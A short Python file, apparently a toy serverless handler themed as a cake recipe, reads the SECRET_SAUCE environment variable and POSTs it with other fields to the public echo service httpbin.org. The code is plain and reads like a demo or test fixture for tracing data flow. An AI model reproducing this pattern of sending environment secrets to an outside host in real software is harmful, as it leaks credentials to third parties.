import requests
import os


def get_secret_ingrediant():
    return os.environ.get('SECRET_SAUCE')


def get_all_ingredients(spice):
    return {
        "ingrediant_1": "sugar",
        "ingrediant_2": "butter",
        "secret_sauce": get_secret_ingrediant(),
        "new_ingrediant": spice
    }


def send_cake_recipe(new_ingrediant):
    resp = requests.post(API_PATH, data=get_all_ingredients(new_ingrediant))
    return resp


HOSTNAME = "https://httpbin.org/"
API_PATH = '{0}post'.format(HOSTNAME)


def rm_handler(event, context):
    return send_cake_recipe(event)
